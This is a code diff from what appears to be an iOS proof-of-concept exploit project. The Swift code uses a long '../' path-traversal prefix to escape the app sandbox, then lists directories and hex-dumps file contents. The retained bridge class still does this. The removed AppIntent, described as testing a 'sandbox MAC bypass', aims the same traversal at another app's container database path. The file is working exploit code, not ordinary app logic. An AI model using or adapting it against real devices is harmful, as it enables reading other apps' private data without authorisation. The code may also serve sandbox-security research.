@@ -1,7 +1,4 @@
-import AppIntents
 import Foundation
-
-// MARK: - ObjC Bridge (callable from ViewController.m via UAFPoc-Swift.h)
 
 @objc public class SwordAppIntentBridge: NSObject {
 
@@ -10,7 +7,7 @@ import Foundation
         let base = "../../../../../../../../../../../../../"
         let fullPath = (base + dirPath as NSString).expandingTildeInPath
 
-        var result = "[Swift AppIntents Bridge]\n"
+        var result = "[Swift Bridge]\n"
         result += "target: \(fullPath)\n"
 
         var isDir: ObjCBool = false
@@ -25,17 +22,6 @@ import Foundation
                 }
             } else {
                 result += "Foundation contentsOfDir: FAILED\n"
-            }
-            if let enumerator = fm.enumerator(atPath: fullPath) {
-                result += "\nRecursive enumerator (first 100):\n"
-                var count = 0
-                while let file = enumerator.nextObject() as? String, count < 100 {
-                    result += "  \(file)\n"
-                    count += 1
-                }
-                result += "  total: \(count) shown\n"
-            } else {
-                result += "Recursive enumerator: FAILED\n"
             }
         } else if exists {
             if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
@@ -66,49 +52,3 @@ import Foundation
         return "[-] \(relPath)"
     }
 }
-
-// MARK: - App Intent (matches reference PoC pattern exactly)
-
-public struct SwordDirectoryIntent: AppIntent {
-    public static var title: LocalizedStringResource = "Enumerate Directory"
-    public static var description: IntentDescription = IntentDescription(
-        "Enumerates a directory path — tests sandbox MAC bypass"
-    )
-
-    public init() {}
-
-    @MainActor
-    public func perform() async throws -> some IntentResult {
-        let fm = FileManager.default
-        let base = "../../../../../../../../../../../../../"
-        let fullPath = (base + "var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Documents/db" as NSString).expandingTildeInPath
-
-        print("[SwordDirectoryIntent] target: \(fullPath)")
-
-        var isDir: ObjCBool = false
-        guard fm.fileExists(atPath: fullPath, isDirectory: &isDir) else {
-            print("[SwordDirectoryIntent] NOT FOUND")
-            return .result()
-        }
-
-        if isDir.boolValue {
-            if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
-                print("[SwordDirectoryIntent] entries: \(contents.count)")
-                for entry in contents.prefix(500) {
-                    print("  \(entry)")
-                }
-            } else {
-                print("[SwordDirectoryIntent] contentsOfDirectory: BLOCKED")
-            }
-        } else {
-            if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
-                print("[SwordDirectoryIntent] file size: \(data.count) bytes")
-                let preview = data.prefix(200).map { String(format: "%02x", $0) }.joined(separator: " ")
-                print("  hex: \(preview)")
-            }
-        }
-
-        return .result()
-    }
-}
-
